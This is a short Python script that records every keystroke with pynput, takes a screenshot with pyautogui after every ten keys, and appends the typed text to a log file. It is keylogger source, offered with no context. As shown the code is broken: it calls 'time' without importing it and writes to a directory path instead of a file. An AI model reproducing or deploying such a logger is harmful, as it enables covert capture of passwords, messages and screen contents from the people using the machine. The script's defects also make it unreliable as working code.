from pynput.keyboard import Key, Listener
import os
import pyautogui

dosya = r"C:\Users"
count = 0
keys = []

def on_press(key):
    global count, keys
    count += 1
    print("{0} was pressed...".format(key))
    keys.append(key)

    if count >= 10:
        count = 0
        screenshot_path = r'C:\Users\ytaal\image' + str(time.time()) + '.png'
        pyautogui.screenshot(screenshot_path)
        write_file(keys)
        keys = []

def write_file(keys):
    with open(dosya, "a", encoding="utf-8") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                file.write(" ")
            elif k.find("Key") == -1:
                file.write(k)
            elif k.find("enter") > 0:
                file.write("\n")

def on_release(key):
    if key == Key.esc:
        print("The file was successfully saved")
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
